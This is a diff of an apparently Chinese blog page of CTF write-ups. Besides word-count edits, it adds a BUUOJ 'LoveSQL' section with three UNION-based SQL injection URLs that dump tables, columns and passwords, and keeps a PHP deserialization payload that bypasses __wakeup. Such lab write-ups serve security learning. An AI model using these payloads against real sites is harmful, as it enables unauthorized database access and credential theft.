@@ -135,7 +135,7 @@
                   
                   &nbsp;<i class="far fa-chart-bar"></i>
                   <span class="post-count">
-                    1.1k 字
+                    1.3k 字
                   </span>&nbsp;
                 
 
@@ -143,7 +143,7 @@
                   
                   &nbsp;<i class="far fa-clock"></i>
                   <span class="post-count">
-                      5 分钟
+                      6 分钟
                   </span>&nbsp;
                 
 
@@ -269,12 +269,16 @@ class Name{
 <pre><code>$a = new Name(&#39;admin&#39;,100);
 $b=serialize($a);
 echo $b;
-</code></pre><p>魔术方法:serialize() 函数会检查类中是否存在一个魔术方法 <strong>sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。与之相反，unserialize() 会检查是否存在一个 </strong>wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。<br>所以这里需要修改Object后的数字来绕过魔术方法，也是一个比较常见的知识点。</p>
+</code></pre><p>serialize() 函数会检查类中是否存在一个魔术方法<code>__sleep()</code>。如果存在，该方法会先被调用，然后才执行序列化操作。与之相反，unserialize() 会检查是否存在一个<code>__wakeup()</code>方法。如果存在，则会先调用<code>__wakeup</code>方法，预先准备对象需要的资源。<br>所以这里需要修改Object后的数字来绕过魔术方法，也是一个比较常见的知识点。</p>
 <pre><code>O:4:&quot;Name&quot;:2:{s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;}
 </code></pre><p>修改为</p>
 <pre><code>O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;}
 </code></pre><p>这里的%00是因为私有变量序列化后会产生\x00，复制以后就丢失了，在浏览器上自己补充上%00.</p>
 <pre><code>payload:index.php?select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;}
+</code></pre><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>联合注入，测试字段，发现是3个，有回显，直接爆库爆表爆列查询。payload:</p>
+<pre><code>http://fb22b7cd-389b-40ea-913f-020616bf3b1b.node3.buuoj.cn/check.php?username=1%27%20union%20select%201,2,group_concat(table_name) from information_schema.tables where table_schema=database() %23&amp;password=1
+http://fb22b7cd-389b-40ea-913f-020616bf3b1b.node3.buuoj.cn/check.php?username=1%27%20union%20select%201,2,group_concat(column_name) from information_schema.columns where table_name=&#39;l0ve1ysq1&#39; %23&amp;password=1
+http://fb22b7cd-389b-40ea-913f-020616bf3b1b.node3.buuoj.cn/check.php?username=1%27%20union%20select%201,2,group_concat(password) from l0ve1ysq1 %23&amp;password=1
 </code></pre>
             <hr>
           </div>
